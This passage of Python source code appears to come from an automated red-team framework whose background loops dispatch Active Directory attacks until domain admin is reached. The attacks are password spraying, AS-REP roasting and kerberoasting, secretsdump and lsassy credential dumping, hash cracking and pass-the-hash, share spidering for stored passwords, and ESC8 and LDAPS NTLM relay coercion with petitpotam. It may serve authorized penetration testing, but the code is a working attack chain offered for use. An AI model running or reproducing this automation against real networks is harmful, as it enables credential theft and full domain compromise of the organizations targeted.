                                    f"⏰ Auto-ADCS: Task {task_id} stuck for {elapsed:.0f}s, "
                                    f"marking {server_ip} as failed"
                                )
                                # Increment failure count to skip retries
                                adcs_attempts[cred_key] = (task_id, max_retries, last_attempt)
                                continue
                            # Task still in progress and not stuck yet
                            continue

                        # Task not in pending_tasks means it completed/failed
                        logger.info(
                            f"🔄 Auto-ADCS: Retrying {server_ip} with {cred.domain}\\{cred.username} "
                            f"(attempt {attempt_count + 1}/{max_retries})"
                        )
                    else:
                        attempt_count = 0

                    # Find the best domain for this enumeration
                    target_domain = cred.domain
                    if not target_domain:
                        target_domain = state.target.domain if state.target else ""
                    if not target_domain and domains:
                        target_domain = next(iter(domains))

                    if not target_domain:
                        continue

                    logger.warning(
                        f"🔐 Auto-ADCS: Found ADCS server {server_ip} ({server_hostname}), "
                        f"dispatching certipy_find with {cred.domain}\\{cred.username}"
                    )

                    task_id = await dispatcher.request_adcs_enumeration(
                        source_agent="orchestrator",
                        target_ip=server_ip,
                        domain=target_domain,
                        username=cred.username,
                        password=cred.password,
                    )

                    if task_id:
                        adcs_attempts[cred_key] = (task_id, attempt_count + 1, current_time)
                        logger.info(f"ADCS enumeration task {task_id} dispatched for {server_ip}")
                        # Only dispatch one task per server per cycle
                        break

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"ADCS enumeration error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_share_spider(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Background task that automatically spiders discovered shares for credentials.

    When shares with READ access are discovered and we have valid credentials,
    dispatch share_spider tasks to search for sensitive files like:
    - Configuration files with passwords
    - Scripts with hardcoded credentials
    - Text files with credential information

    This catches common scenarios like credentials stored in share files.
    """
    # Track which (host, share, cred) combos we've already spidered
    spidered_shares: set[tuple[str, str, str, str]] = set()

    while True:
        try:
            state = dispatcher.shared_state

            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto share spider")
                break

            # Need credentials to spider shares (authenticated access)
            if not state.all_credentials:
                await asyncio.sleep(check_interval)
                continue

            # Find shares with READ access (excluding admin shares)
            readable_shares = [
                share
                for share in state.all_shares
                if share.permissions
                and "READ" in share.permissions.upper()
                and share.name.lower() not in ("ipc$", "print$")
                # Skip admin shares - focus on custom shares like "all", "public"
                and share.name.lower() not in ("admin$", "c$", "d$", "e$")
            ]

            if not readable_shares:
                await asyncio.sleep(check_interval)
                continue

            # For each readable share, try to spider with available credentials
            for share in readable_shares:
                for cred in state.all_credentials:
                    if not cred.password:
                        continue  # Need password for SMB auth

                    # Create unique key for this spider attempt
                    spider_key = (
                        share.host.lower(),
                        share.name.lower(),
                        cred.username.lower(),
                        (cred.domain or "").lower(),
                    )

                    if spider_key in spidered_shares:
                        continue

                    # Dispatch share spider task
                    domain = cred.domain or (state.target.domain if state.target else "")
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=[share.host],
                        username=cred.username,
                        password=cred.password,
                        reason=f"auto_share_spider_{share.name}",
                        techniques=["share_spider"],
                    )

                    if task_id:
                        spidered_shares.add(spider_key)
                        logger.info(
                            "🕷️ Auto share spider dispatched: {}\\{} -> {}/{} (task {})",
                            cred.domain or "(local)",
                            cred.username,
                            share.host,
                            share.name,
                            task_id,
                        )
                        # Only spider each share once per credential - don't flood
                        break

            await asyncio.sleep(check_interval)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto share spider error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_bloodhound(  # noqa: PLR0912
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
    max_retries: int = 3,
) -> None:
    """
    Background task that automatically runs BloodHound when credentials are discovered.

    BloodHound collection is critical for finding attack paths to Domain Admin.
    This ensures it runs early once we have valid credentials, without relying
    on the orchestrator to remember to dispatch it.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for new credentials
        max_retries: Maximum retry attempts per domain
    """
    # Track (domain, username) -> (task_id, attempt_count, last_attempt_time)
    bloodhound_attempts: dict[tuple[str, str], tuple[str, int, float]] = {}
    successful_domains: set[str] = set()  # Domains with successful BloodHound
    retry_cooldown = 120.0  # Wait 2 minutes before retrying failed tasks

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping BloodHound automation")
                break

            # Need credentials to run BloodHound
            if not state.all_credentials:
                logger.debug("BloodHound scanner: waiting for credentials")
                continue

            # Get all known domains
            domains: set[str] = set()
            if state.target and state.target.domain:
                domains.add(state.target.domain.lower())
            for cred in state.all_credentials:
                if cred.domain:
                    domains.add(cred.domain.lower())

            if not domains:
                continue

            current_time = asyncio.get_event_loop().time()

            # Try to run BloodHound for each domain
            for domain in domains:
                # Skip domains we've already successfully enumerated
                if domain.lower() in successful_domains:
                    continue

                # Find a credential for this domain
                for cred in state.all_credentials:
                    if not cred.password:
                        continue

                    cred_domain = (cred.domain or "").lower()
                    # Use credentials from same domain, or if no domain try anyway
                    if cred_domain and cred_domain != domain.lower():
                        continue

                    cred_key = (domain.lower(), cred.username.lower())

                    # Check if we've already attempted with this credential
                    if cred_key in bloodhound_attempts:
                        task_id, attempt_count, last_attempt = bloodhound_attempts[cred_key]

                        # Check if the task completed successfully
                        task_info = state.pending_tasks.get(task_id)
                        if task_info and task_info.status == TaskStatus.COMPLETED:
                            successful_domains.add(domain.lower())
                            logger.info(f"BloodHound collection succeeded for {domain}")
                            break

                        # Skip if max retries reached
                        if attempt_count >= max_retries:
                            continue

                        # Skip if still in cooldown
                        if current_time - last_attempt < retry_cooldown:
                            continue

                        # Check if task failed (not in pending_tasks means it completed/failed)
                        if task_id not in state.pending_tasks:
                            logger.info(
                                f"🔄 Auto-BloodHound: Retrying {domain} with {cred.domain}\\{cred.username} "
                                f"(attempt {attempt_count + 1}/{max_retries})"
                            )
                        else:
                            # Task still in progress
                            continue
                    else:
                        attempt_count = 0

                    logger.warning(
                        f"🩸 Auto-BloodHound: Dispatching collection for {domain} "
                        f"with {cred.domain}\\{cred.username}"
                    )

                    task_id = await dispatcher.request_recon(
                        source_agent="orchestrator",
                        domain=domain,
                        username=cred.username,
                        password=cred.password,
                        reason="bloodhound",
                        techniques=["bloodhound"],
                    )

                    if task_id:
                        bloodhound_attempts[cred_key] = (task_id, attempt_count + 1, current_time)
                        logger.info(f"BloodHound task {task_id} dispatched for {domain}")
                        # Only dispatch one task per domain per cycle
                        break

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"BloodHound automation error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_credential_access(  # noqa: PLR0912
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
    min_hosts: int = 1,
) -> None:
    """
    Background task that proactively runs credential access techniques.

    1) If no creds/hashes yet, run no-creds AS-REP roast per domain.
    2) For each new credential/hash, run kerberoast + secretsdump attempts.
    3) When new users are discovered without credentials, run username_as_password.
    """
    processed_creds: set[tuple[str, str, str]] = set()
    processed_hashes: set[tuple[str, str, str]] = set()
    processed_crack_hashes: set[tuple[str, str, str, str]] = set()
    processed_no_cred_domains: set[str] = set()
    processed_username_spray_domains: set[str] = set()  # Domains we've run username_as_password on
    processed_password_spray_domains: set[str] = set()  # Domains we've run password_spray on
    last_user_count: dict[str, int] = {}  # Track user counts per domain to detect new users

    while True:
        try:
            state = dispatcher.shared_state

            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto credential access")
                break

            if len(state.all_hosts) < min_hosts and not state.target:
                logger.debug(
                    f"Waiting for hosts ({len(state.all_hosts)}/{min_hosts}) "
                    "before credential access"
                )
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            host_ips = [h.ip for h in state.all_hosts if h.ip]
            if not host_ips and state.target and state.target.ip:
                host_ips = [state.target.ip]

            hosts_by_domain: dict[str, list[str]] = {}
            for host in state.all_hosts:
                if not host.ip:
                    continue
                hostname = (host.hostname or "").lower()
                if "." in hostname:
                    host_domain = hostname.split(".", 1)[1]
                    hosts_by_domain.setdefault(host_domain, []).append(host.ip)
            if state.target and state.target.domain and state.target.ip:
                hosts_by_domain.setdefault(state.target.domain.lower(), []).append(state.target.ip)

            domains: set[str] = set()
            if state.target and state.target.domain:
                domains.add(state.target.domain)
            for cred in state.all_credentials:
                if cred.domain:
                    domains.add(cred.domain)
            for user in state.all_users:
                if user.domain:
                    domains.add(user.domain)

            if not domains:
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            has_new_creds = any(
                (cred.username, cred.domain or "", cred.password or "") not in processed_creds
                for cred in state.all_credentials
            )
            has_new_hashes = any(
                (hash_obj.username, hash_obj.domain or "", hash_obj.hash_value)
                not in processed_hashes
                for hash_obj in state.all_hashes
            )
            has_new_cracks = any(
                (
                    hash_obj.username,
                    hash_obj.domain or "",
                    hash_obj.hash_value,
                    (hash_obj.hash_type or "").upper(),
                )
                not in processed_crack_hashes
                and not hash_obj.cracked_password
                for hash_obj in state.all_hashes
            )
            has_new_domains = (
                not state.all_credentials
                and not state.all_hashes
                and any(domain not in processed_no_cred_domains for domain in domains)
            )
            # Check if any domain has users but hasn't had password spray run yet
            has_unsprayed_users = any(
                domain not in processed_password_spray_domains
                and sum(1 for u in state.all_users if (u.domain or "").lower() == domain.lower())
                >= 3
                for domain in domains
            )

            if not (
                has_new_creds
                or has_new_hashes
                or has_new_cracks
                or has_new_domains
                or has_unsprayed_users
            ):
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            if not state.all_credentials and not state.all_hashes:
                for domain in sorted(domains):
                    if domain in processed_no_cred_domains:
                        continue
                    domain_hosts = hosts_by_domain.get(domain.lower(), []) or host_ips
                    # Include low-hanging fruit techniques that work without credentials
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=domain_hosts,
                        reason="low_hanging_fruit_no_creds",
                        techniques=[
                            "username_as_password",  # Test user:user combos (e.g., hodor:hodor)
                            "password_spray",  # Common passwords
                            "asrep_roast",  # Users without pre-auth
                        ],
                    )
                    if task_id:
                        processed_no_cred_domains.add(domain)
                        logger.info(
                            f"Auto credential access (low-hanging fruit, no-creds) dispatched for domain {domain}"
                        )

            # Check for new users without credentials - run username_as_password on them
            # This catches cases like hodor:hodor where username equals password
            for domain in sorted(domains):
                # Find users in this domain that don't have credentials
                domain_users = [
                    u.username
                    for u in state.all_users
                    if (u.domain or "").lower() == domain.lower()
                ]
                users_with_creds = {
                    c.username.lower()
                    for c in state.all_credentials
                    if (c.domain or "").lower() == domain.lower()
                }
                users_without_creds = [u for u in domain_users if u.lower() not in users_with_creds]

                # Find an existing credential for this domain to use for user enumeration
                enum_cred = None
                for c in state.all_credentials:
                    if (c.domain or "").lower() == domain.lower() and c.password:
                        enum_cred = c
                        break

                domain_hosts = hosts_by_domain.get(domain.lower(), []) or host_ips

                # Run username_as_password if we have enough users and haven't done it yet
                should_run_username_spray = domain not in processed_username_spray_domains
                if domain in processed_username_spray_domains:
                    # Re-run if we've discovered significantly more users
                    current_count = len(domain_users)
                    prev_count = last_user_count.get(domain.lower(), 0)
                    should_run_username_spray = current_count > prev_count + 5

                if should_run_username_spray and len(users_without_creds) >= 3:
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=domain_hosts,
                        username=enum_cred.username if enum_cred else "",
                        password=enum_cred.password if enum_cred else None,
                        reason="low_hanging_fruit_new_users",
                        techniques=["username_as_password"],
                    )
                    if task_id:
                        processed_username_spray_domains.add(domain)
                        last_user_count[domain.lower()] = len(domain_users)
                        cred_info = (
                            f"{enum_cred.domain}\\{enum_cred.username}"
                            if enum_cred
                            else "null session"
                        )
                        logger.info(
                            f"Auto username_as_password dispatched for {len(users_without_creds)} users without creds in {domain} (using {cred_info} for enum)"
                        )

                # Run password_spray with common passwords if we have users and haven't done it
                # This is separate from username_as_password - we spray common passwords
                if domain not in processed_password_spray_domains and len(domain_users) >= 3:
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=domain_hosts,
                        username=enum_cred.username if enum_cred else "",
                        password=enum_cred.password if enum_cred else None,
                        reason="low_hanging_fruit_password_spray",
                        techniques=["password_spray"],
                    )
                    if task_id:
                        processed_password_spray_domains.add(domain)
                        logger.info(
                            f"Auto password_spray dispatched for {len(domain_users)} users in {domain}"
                        )

            for cred in state.all_credentials:
                key = (cred.username, cred.domain or "", cred.password or "")
                if key in processed_creds:
                    continue
                domain_name = cred.domain or (state.target.domain if state.target else "")
                domain_hosts = hosts_by_domain.get(domain_name.lower(), []) or host_ips
                task_id = await dispatcher.request_credential_access(
                    source_agent="orchestrator",
                    domain=domain_name,
                    target_ips=domain_hosts,
                    username=cred.username,
                    password=cred.password,
                    credential_source=cred.source,
                    reason="new_credential",
                    techniques=["kerberoast", "secretsdump", "lsassy"],
                )
                # Also dispatch FAST credential discovery separately (only needs DC targets)
                # These are high-value low-hanging fruit that take ~2-5 seconds each
                # Running them separately ensures they complete quickly without getting
                # blocked by slow recon (smb_sweep) or credential dumping (secretsdump)
                dc_hosts = [
                    h
                    for h in domain_hosts
                    if any(
                        r in ("DC", "Domain Controller")
                        for r in (
                            next((host.roles for host in state.all_hosts if host.ip == h), []) or []
                        )
                    )
                ] or domain_hosts[:1]  # Fall back to first host if no DC identified
                await dispatcher.request_credential_access(
                    source_agent="orchestrator",
                    domain=domain_name,
                    target_ips=dc_hosts,
                    username=cred.username,
                    password=cred.password,
                    credential_source=cred.source,
                    reason="fast_credential_discovery",
                    techniques=[
                        "sysvol_script_search",  # ~2 sec, hardcoded passwords in SYSVOL
                        "gpp_password_finder",  # ~2 sec, GPP/cpassword credentials
                        "ldap_search_descriptions",  # ~3 sec, passwords in user descriptions
                        "laps_dump",  # ~2 sec, LAPS local admin passwords
                    ],
                )
                if task_id:
                    processed_creds.add(key)
                    logger.info(
                        "Auto credential access dispatched for {}\\{} (source={})",
                        cred.domain or "(unknown)",
                        cred.username,
                        cred.source or "unknown",
                    )

            for hash_obj in state.all_hashes:
                key = (hash_obj.username, hash_obj.domain or "", hash_obj.hash_value)
                # Credential access (pass-the-hash) only for NTLM-compatible hashes
                if key not in processed_hashes:
                    if not _is_pass_the_hash_compatible(hash_obj.hash_value, hash_obj.hash_type):
                        logger.info(
                            "Skipping credential access for {}\\{}: non-NTLM hash type {}",
                            hash_obj.domain or "(unknown)",
                            hash_obj.username,
                            hash_obj.hash_type or "unknown",
                        )
                        processed_hashes.add(key)
                    else:
                        domain_name = hash_obj.domain or (
                            state.target.domain if state.target else ""
                        )
                        domain_hosts = hosts_by_domain.get(domain_name.lower(), []) or host_ips
                        task_id = await dispatcher.request_credential_access(
                            source_agent="orchestrator",
                            domain=domain_name,
                            target_ips=domain_hosts,
                            username=hash_obj.username,
                            hash_value=hash_obj.hash_value,
                            hash_type=hash_obj.hash_type,
                            reason="new_hash",
                            techniques=["kerberoast", "secretsdump", "lsassy"],
                        )
                        if task_id:
                            processed_hashes.add(key)
                            logger.info(
                                "Auto credential access dispatched for {}\\{} (hash_type={})",
                                hash_obj.domain or "(unknown)",
                                hash_obj.username,
                                hash_obj.hash_type or "unknown",
                            )

                # Crack requests for ALL hashes (AS-REP, Kerberoast, NTLM, etc.)
                crack_key = (
                    hash_obj.username,
                    hash_obj.domain or "",
                    hash_obj.hash_value,
                    (hash_obj.hash_type or "").upper(),
                )
                if hash_obj.cracked_password:
                    processed_crack_hashes.add(crack_key)
                    continue
                if crack_key in processed_crack_hashes:
                    continue

                # Determine priority based on hash type
                # Kerberoast hashes have higher priority - service accounts often have weak passwords
                # AS-REP hashes also get boosted priority
                crack_priority = 5  # Default priority
                hash_value_lower = hash_obj.hash_value.lower()
                hash_type_upper = (hash_obj.hash_type or "").upper()

                if "$krb5tgs$" in hash_value_lower or "KERBEROAST" in hash_type_upper:
                    crack_priority = 2  # High priority - service accounts often weak
                    logger.info(
                        f"Kerberoast hash detected for {hash_obj.domain}\\{hash_obj.username}, "
                        f"boosting crack priority to {crack_priority}"
                    )
                elif "$krb5asrep$" in hash_value_lower or "ASREP" in hash_type_upper:
                    crack_priority = 3  # Medium-high priority
                    logger.info(
                        f"AS-REP hash detected for {hash_obj.domain}\\{hash_obj.username}, "
                        f"boosting crack priority to {crack_priority}"
                    )

                crack_task_id = await dispatcher.request_crack(
                    hash_value=hash_obj.hash_value,
                    hash_type=hash_obj.hash_type,
                    source_agent="orchestrator",
                    username=hash_obj.username,
                    domain=hash_obj.domain,
                    priority=crack_priority,
                )
                if crack_task_id:
                    processed_crack_hashes.add(crack_key)
                    logger.info(
                        "Auto crack dispatched for {}\\{} ({}, priority={})",
                        hash_obj.domain or "(unknown)",
                        hash_obj.username,
                        hash_obj.hash_type or "unknown",
                        crack_priority,
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto credential access error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_coercion(  # noqa: PLR0912
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
) -> None:
    """
    Background task that automatically triggers coercion attacks when conditions are met.

    Monitors for:
    1. ADCS servers with web enrollment → ESC8 relay attacks (ntlmrelayx + petitpotam)
    2. Domain controllers → petitpotam/coercer coercion for credential relay
    3. Writable shares → potential for file-based coercion (.lnk/.scf drops)

    This automates the coercion workflow that attackers would normally coordinate manually.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between coercion checks
    """
    # Track what we've already triggered to avoid duplicates
    esc8_attempted_servers: set[str] = set()  # ADCS servers we've started ESC8 against
    coerced_dcs: set[str] = set()  # DCs we've attempted to coerce
    writable_share_targets: set[tuple[str, str]] = set()  # (host, share) combos notified

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto coercion")
                break

            # Need at least some credentials to make coercion worthwhile
            # (captured hashes need to be relayed or cracked)
            if not state.all_credentials and not state.all_hashes:
                logger.debug("Auto coercion: waiting for credentials before starting coercion")
                continue

            # Helper function to detect Domain Controllers
            def _is_dc(host: Host) -> bool:
                """Check if host is a Domain Controller.

                Detection methods:
                1. Explicit DC roles (from SRV lookup or BloodHound)
                2. DC services (Kerberos 88, LDAP 389)
                3. Hostname contains "dc"
                """
                # Check explicit roles (from SRV lookup, BloodHound, or manual tagging)
                if any(
                    r.lower() in ("dc", "domain controller", "domaincontroller", "ad dc")
                    for r in (host.roles or [])
                ):
                    return True
                # Check DC-like services (Kerberos, LDAP)
                for svc in host.services or []:
                    svc_lower = svc.lower()
                    if svc_lower.startswith(("88/tcp", "389/tcp")):
                        return True
                    if "kerberos" in svc_lower or "ldap" in svc_lower:
                        return True
                # Check if hostname contains "dc"
                return "dc" in (host.hostname or "").lower()

            # === ESC8 RELAY ATTACK ===
            # When ADCS servers with web enrollment are detected, start ntlmrelayx + petitpotam
            adcs_servers = dispatcher.find_adcs_servers()
            for server_ip, server_hostname in adcs_servers:
                if server_ip in esc8_attempted_servers:
                    continue

                # Find a DC to coerce for ESC8 (DCs authenticating to ADCS = domain admin cert)
                dcs = [
                    h
                    for h in state.all_hosts
                    if _is_dc(h) and h.ip != server_ip  # Don't coerce the ADCS server to itself
                ]

                if not dcs:
                    logger.debug(f"Auto coercion: ADCS {server_ip} found but no DCs to coerce yet")
                    continue

                # Pick the first available DC
                target_dc = dcs[0]

                # Dispatch ESC8 coercion task
                # This will start ntlmrelayx to ADCS and coerce the DC
                task_id = await dispatcher.request_coercion(
                    source_agent="orchestrator",
                    techniques=["petitpotam", "coercer"],
                    payload_override={
                        "attack_type": "esc8",
                        "adcs_server": server_ip,
                        "adcs_hostname": server_hostname,
                        "coerce_target": target_dc.ip,
                        "coerce_hostname": target_dc.hostname,
                        "note": (
                            f"ESC8 RELAY ATTACK: Start ntlmrelayx targeting "
                            f"http://{server_hostname or server_ip}/certsrv/ with template "
                            f"DomainController, then coerce {target_dc.hostname or target_dc.ip} "
                            f"with petitpotam to get DC certificate for domain admin."
                        ),
                    },
                )

                if task_id:
                    esc8_attempted_servers.add(server_ip)
                    logger.warning(
                        f"🎯 Auto ESC8 coercion dispatched: relay to ADCS {server_hostname or server_ip}, "
                        f"coerce DC {target_dc.hostname or target_dc.ip} (task {task_id})"
                    )

            # === DC COERCION FOR LDAPS RELAY ===
            # Even without ADCS, coercing DCs to an LDAPS relay can grant RBCD/shadow creds
            for host in state.all_hosts:
                # Reuse the _is_dc function defined above for ESC8
                if not _is_dc(host) or host.ip in coerced_dcs:
                    continue

                # Only coerce if we have credentials to authenticate the relay
                if not state.all_credentials:
                    continue

                # Dispatch LDAPS relay coercion
                task_id = await dispatcher.request_coercion(
                    source_agent="orchestrator",
                    techniques=["petitpotam", "coercer"],
                    payload_override={
                        "attack_type": "ldaps_relay",
                        "coerce_target": host.ip,
                        "coerce_hostname": host.hostname,
                        "relay_target": host.ip,  # Relay to same DC's LDAPS
                        "note": (
                            f"LDAPS RELAY: Start ntlmrelayx targeting ldaps://{host.ip} with "
                            f"--delegate-access, then coerce {host.hostname or host.ip} with "
                            f"petitpotam to create machine account for RBCD attack."
                        ),
                    },
                )

                if task_id:
                    coerced_dcs.add(host.ip)
                    logger.warning(
                        f"🎯 Auto LDAPS relay coercion dispatched: coerce DC {host.hostname or host.ip} "
                        f"for RBCD (task {task_id})"
                    )
                    # Only do one DC at a time to avoid overwhelming the coercion agent
                    break

            # === WRITABLE SHARE NOTIFICATION ===
            # Log writable shares that could be used for file-based coercion (.lnk/.scf drops)
            # Note: slinky module not currently available, but we flag the opportunity
            for share in state.all_shares:
                perms = (share.permissions or "").upper()
                if "WRITE" not in perms:
                    continue

                share_key = (share.host.lower(), share.name.lower())
                if share_key in writable_share_targets:
                    continue

                # Skip admin shares
                if share.name.lower() in ("admin$", "c$", "d$", "e$", "ipc$"):
                    continue

                writable_share_targets.add(share_key)
                logger.info(
                    f"📁 Writable share detected: {share.host}/{share.name} ({perms}) - "
                    f"potential target for file-based coercion (.lnk/.scf drop)"
                )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto coercion error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_delegation_enumeration(  # noqa: PLR0912
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
) -> None:
    """
    Background task that automatically runs delegation enumeration for discovered credentials.

    When credentials are discovered, dispatches find_delegation tasks to enumerate:
    - Unconstrained delegation (machines that can impersonate any user)
    - Constrained delegation (machines that can impersonate to specific services)

    These are high-value targets for privilege escalation.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for new credentials
    """
    # Track credentials that have completed successfully - only these won't be retried
    processed_creds: set[tuple[str, str]] = set()
    # Track dispatched tasks: task_id -> cred_key (for checking completion status)
    dispatched_tasks: dict[str, tuple[str, str]] = {}

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping delegation enumeration")
                break

            # Check for completed/failed tasks and update processed_creds accordingly
            completed_task_ids = list(dispatched_tasks.keys())
            for task_id in completed_task_ids:
                cred_key = dispatched_tasks[task_id]

                # Check if task is still pending (running)
                if task_id in state.pending_tasks:
                    continue  # Still running, check later

                # Task finished - check if it succeeded or failed
                task_result = state.completed_tasks.get(task_id)
                if task_result:
                    # Remove from dispatched regardless of outcome
                    del dispatched_tasks[task_id]

                    if task_result.success:
                        # Task succeeded - mark credential as processed (won't retry)
                        processed_creds.add(cred_key)
                        logger.info(
                            f"✅ Auto-delegation task {task_id} succeeded for "
                            f"{cred_key[0]}\\{cred_key[1]}"
                        )
                    else:
                        # Task failed - DON'T add to processed_creds so it can be retried
                        logger.warning(
                            f"❌ Auto-delegation task {task_id} failed for "
                            f"{cred_key[0]}\\{cred_key[1]}: {task_result.error}. "
                            f"Will retry on next cycle."
                        )
                else:
                    # Task not in pending or completed - probably lost, allow retry
                    logger.warning(
                        f"⚠️ Auto-delegation task {task_id} missing for "
                        f"{cred_key[0]}\\{cred_key[1]}, allowing retry"
                    )
                    del dispatched_tasks[task_id]

            # Need credentials to enumerate delegation
            if not state.all_credentials:
                logger.debug("Auto-delegation: waiting for credentials")
                continue

            # Find new credentials with passwords
            for cred in state.all_credentials:
                if not cred.password:
                    continue

                cred_key = ((cred.domain or "").lower(), cred.username.lower())

                # Skip if already processed successfully
                if cred_key in processed_creds:
                    continue

                # Skip if currently dispatched (task in flight)
                if cred_key in dispatched_tasks.values():
                    continue

                # Get domain for this credential
                domain = cred.domain or (state.target.domain if state.target else "")
                if not domain:
                    continue

                # Dispatch delegation enumeration to PRIVESC agent (has DelegationTools)
                logger.info(
                    f"🔍 Auto-delegation: Running find_delegation for {cred.domain}\\{cred.username}"
                )

                task_id = await dispatcher.request_privesc_enumeration(
                    source_agent="orchestrator",
                    domain=domain,
                    username=cred.username,
                    password=cred.password,
                    techniques=["find_delegation"],
                )

                if task_id:
                    # Track as dispatched - will be marked processed only on success
                    dispatched_tasks[task_id] = cred_key
                    logger.info(
                        f"Auto-delegation task {task_id} dispatched for {cred.domain}\\{cred.username}"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto delegation enumeration error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_local_admin_secretsdump(  # noqa: PLR0912
    dispatcher: RedTeamDispatcher,
    check_interval: float = 45.0,
) -> None:
    """
    Background task that automatically runs secretsdump when local admin access is detected.

    When BloodHound or CME identifies that a user has local admin rights on a host,
    this workflow automatically dispatches secretsdump to harvest credentials.

    This catches scenarios like:
    - User is member of local Administrators group
    - User has AdminTo relationship in BloodHound
    - CME reports "Pwn3d!" for a credential/host combination

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for admin access opportunities
    """
    # Track (host_ip, cred_key) -> task_id for deduplication
    secretsdump_attempts: dict[tuple[str, str, str], str] = {}
    successful_hosts: set[str] = set()  # Hosts where secretsdump succeeded
    failed_attempts: dict[tuple[str, str, str], int] = {}  # Track failures for retry limiting
    max_retries = 2

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto local admin secretsdump")
                break

            # Check completed tasks to update tracking
            for key, task_id in list(secretsdump_attempts.items()):
                host_ip, username, domain = key

                # Check if task completed
                if task_id not in state.pending_tasks:
                    task_result = state.completed_tasks.get(task_id)
                    if task_result and task_result.success:
                        successful_hosts.add(host_ip)
                        logger.info(
                            f"✅ Auto-secretsdump succeeded on {host_ip} with {domain}\\{username}"
                        )
                    elif task_result and not task_result.success:
                        failed_attempts[key] = failed_attempts.get(key, 0) + 1
                        logger.warning(
                            f"❌ Auto-secretsdump failed on {host_ip} with {domain}\\{username}: "
                            f"{task_result.error} (attempt {failed_attempts[key]}/{max_retries})"
                        )
                    del secretsdump_attempts[key]

            # Find credentials marked as admin
            admin_creds = [c for c in state.all_credentials if c.is_admin and c.password]

            if not admin_creds:
                logger.debug("Auto-secretsdump: no admin credentials found yet")
                continue

            # For each admin credential, try to run secretsdump on relevant hosts
            for cred in admin_creds:
                cred_domain = cred.domain or ""

                # Find hosts in the same domain or hosts where this cred was marked admin
                target_hosts = []
                for host in state.all_hosts:
                    # Skip already successful hosts
                    if host.ip in successful_hosts:
                        continue

                    # Skip hosts without IP
                    if not host.ip:
                        continue

                    # Check if credential source mentions this host (e.g., "Pwn3d! on 192.168.58.10")
                    source_lower = cred.source.lower()
                    if host.ip in source_lower or (
                        host.hostname and host.hostname.lower() in source_lower
                    ):
                        target_hosts.append(host)
                        continue

                    # Check if host is a DC for the credential's domain (high value target)
                    if host.is_dc and cred_domain:
                        hostname_lower = (host.hostname or "").lower()
                        if cred_domain.lower() in hostname_lower:
                            target_hosts.append(host)

                for host in target_hosts:
                    key = (host.ip, cred.username.lower(), cred_domain.lower())

                    # Skip if already attempted and in-flight
                    if key in secretsdump_attempts:
                        continue

                    # Skip if max retries reached
                    if failed_attempts.get(key, 0) >= max_retries:
                        continue

                    # Dispatch secretsdump task
                    logger.warning(
                        f"🔓 Auto-secretsdump: Admin access detected for {cred_domain}\\{cred.username} "
                        f"on {host.ip} ({host.hostname}), dispatching secretsdump"
                    )

                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=cred_domain or (state.target.domain if state.target else ""),
                        target_ips=[host.ip],
                        username=cred.username,
                        password=cred.password,
                        reason="auto_local_admin_secretsdump",
                        techniques=["secretsdump"],
                    )

                    if task_id:
                        secretsdump_attempts[key] = task_id
                        logger.info(
                            f"Auto-secretsdump task {task_id} dispatched for "
                            f"{cred_domain}\\{cred.username} -> {host.ip}"
                        )

            # Also check for BloodHound AdminTo relationships
            # These are stored in discovered_vulnerabilities with local_admin type
            for vuln_id, vuln in state.discovered_vulnerabilities.items():
                if vuln.vuln_type not in ("local_admin", "AdminTo", "CanRDP"):
                    continue

                if vuln_id in state.exploited_vulnerabilities:
                    continue

                target_ip = vuln.target
                if not target_ip or target_ip in successful_hosts:
                    continue

                # Get details about who has admin access
                details = vuln.details or {}
                admin_user = details.get("username") or details.get("principal")
                admin_domain = details.get("domain", "")

                if not admin_user:
                    continue

                # Find matching credential
                matching_cred = None
                for cred in state.all_credentials:
                    if (
                        cred.username.lower() == admin_user.lower()
                        and cred.password
                        and (not admin_domain or cred.domain.lower() == admin_domain.lower())
                    ):
                        matching_cred = cred
                        break

